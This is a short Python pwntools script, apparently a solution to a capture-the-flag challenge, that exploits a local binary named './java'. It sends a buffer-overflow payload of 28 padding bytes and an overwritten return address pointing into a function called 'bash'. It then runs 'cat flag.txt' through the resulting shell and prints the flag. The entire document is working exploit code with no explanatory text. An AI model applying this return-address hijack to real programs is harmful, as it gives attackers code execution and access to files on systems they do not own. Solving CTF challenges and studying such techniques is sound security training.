from pwn import *

context.binary = "./java"

p = process()
p.sendline(b"java" + b"A" * 28 + p64(context.binary.functions["bash"].address + 0x32))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
